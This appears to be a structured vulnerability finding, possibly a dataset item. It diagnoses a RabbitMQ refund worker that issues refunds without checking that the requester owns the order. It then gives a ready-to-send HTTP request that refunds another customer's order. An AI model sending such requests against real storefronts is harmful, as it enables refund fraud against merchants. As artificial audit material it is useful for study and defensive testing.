diagnosis: The RabbitMQ worker processes automated payment refunds. It receives orderId and amountCents directly from the message payload and issues a financial refund without validating whether the requesting customer (requestedBy) is the purchaser of that orderId. An attacker submitting refund events can drain merchant revenue by triggering refunds for arbitrary customer orders.
exploit_request:
POST /api/orders/refund-async HTTP/1.1
Host: shop.storefront.com
Authorization: Bearer <customer_jwt>
Content-Type: application/json

{"orderId": "ord_vip_luxury_88921", "amountCents": 250000}
